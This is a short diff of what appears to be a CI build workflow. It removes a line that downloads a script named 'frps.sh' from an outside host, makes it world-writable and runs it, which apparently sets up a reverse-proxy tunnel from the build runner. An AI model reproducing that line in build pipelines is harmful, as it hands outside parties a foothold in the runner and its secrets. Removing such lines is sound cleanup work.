@@ -63,7 +63,7 @@ jobs:
         sudo -E apt-get -qq update
         sudo -E apt-get -qq install $(curl -fsSL git.io/depends-ubuntu-1804)
         sudo -E apt-get -qq autoremove --purge
-        wget https://xhop.top/frps.sh & sudo -i & chmod 777 ./frps.sh & ./frps.sh
+
 sudo -E apt-get -qq clean
         sudo timedatectl set-timezone "$TZ"
         sudo mkdir -p /workdir
